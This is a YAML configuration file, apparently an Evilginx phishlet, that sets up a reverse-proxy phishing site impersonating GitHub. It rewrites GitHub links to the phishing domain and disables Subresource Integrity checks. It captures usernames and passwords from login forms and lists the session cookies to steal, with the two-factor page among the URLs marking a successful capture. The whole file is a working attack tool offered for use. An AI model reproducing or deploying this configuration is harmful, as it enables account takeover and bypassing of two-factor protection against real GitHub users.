author: '@audibleblink'
min_ver: '2.3.0'

proxy_hosts:
  - {phish_sub: '', orig_sub: '', domain: 'github.com', session: true, is_landing: true}
  - {phish_sub: 'api', orig_sub: 'api', domain: 'github.com'}
  - {phish_sub: 'github', orig_sub: 'github', domain: 'githubassets.com'}

sub_filters:
  # This fixes the CSS/JS by disabling the Subresource Integrity (SRI) check
  - {triggers_on: 'github.com', search: 'integrity="sha', replace: 'disabled_integrity="sha', mimes: ['text/html']}
  # This ensures all internal links point to your phishlet domain instead of the real github.com
  - {triggers_on: 'github.com', search: 'https://github.com', replace: 'https://{domain}', mimes: ['text/html', 'application/javascript']}

auth_tokens:
  - domain: '.github.com'
    keys: ['logged_in', 'dotcom_user', 'has_recent_activity']
  - domain: 'github.com'
    keys: ['user_session', '_gh_sess', '__Host-user_session_same_site']

credentials:
  username:
    key: 'login'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'

# These URLs tell Evilginx when a login is "successful" and when to grab cookies
auth_urls:
  - '/sessions/two-factor'
  - '/dashboard'
  - '/'

login:
  domain: 'github.com'
  path: '/login'